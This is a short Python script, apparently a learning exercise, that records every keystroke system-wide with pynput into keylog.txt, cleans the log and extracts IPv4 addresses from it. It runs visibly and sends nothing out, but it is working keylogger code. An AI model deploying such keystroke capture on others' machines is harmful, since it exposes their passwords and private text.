from pynput.keyboard import Key, Listener
import threading
import re

all = []

#logging all the pressed keys in a file 
def pressed(key):
    global all
    all.append(str(key))
    f = open('keylog.txt', 'a')
    f.write(str(key).strip("'"))
    f.close()

#printing the key everytime it's pressed
def released(key):
    print ("\n{} key released".format(key))
    pass

#starting the previous functions
def keylog():
    l= Listener(on_press=pressed, on_release=released)
    l.start()

th = threading.Thread(target=keylog)
th.start()

text = input("Enter somthing to quit : \n")
if KeyboardInterrupt : 
    print ("\nPrinting all the keys that have been logged : \n")
    for one in all:
       print (one.strip("'"))
    
#making a readable file without Key codes
with open('keylog.txt') as f:
   string = str(f.readlines())
   c = string.count("Key.backspace")+string.count("Key.space")+string.count("Key.enter") #count how many keys there are in the file
   for i in range(c):
      #delete the letter befor a 'backspace' and replace it with the letter after the 'backspace'
      new_str = string.replace( string[string.find("Key.backspace")-1]+"Key.backspace" , "" ) 
      string = new_str
      
      new_str = string.replace("Key.spaceKey.backspace", "")
      string = new_str
      new_str = string.replace("Key.space", "\n") #replacing it with '\n' just to make every word in a newline to help us detect ipaddresses in each line
      string = new_str
      new_str = string.replace("Key.enter", "\n")
      string = new_str
      new_str = string.replace("Key.enterKey.backspace", "")
      string = new_str
   new_f = open("newfile.txt",'w')
   new_f.write(str(string).strip("[']"))
   new_f.close()

#opening and reading the file
with open('newfile.txt') as fh:
    fstring = fh.readlines()
    
#declaring the regex pattern for ip adress 
pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')   #the pattern of an IPv4 Address

#initiating the list object 
lst = []

#extracting the ip addresses
for line in fstring:
    try:
       lst.append(pattern.search(line)[0])
    except TypeError:   
       pass

#displaying the extracted IP Addresses
print ("\nPrinting all the IP Addresses that have been detected :\n")
print (lst)
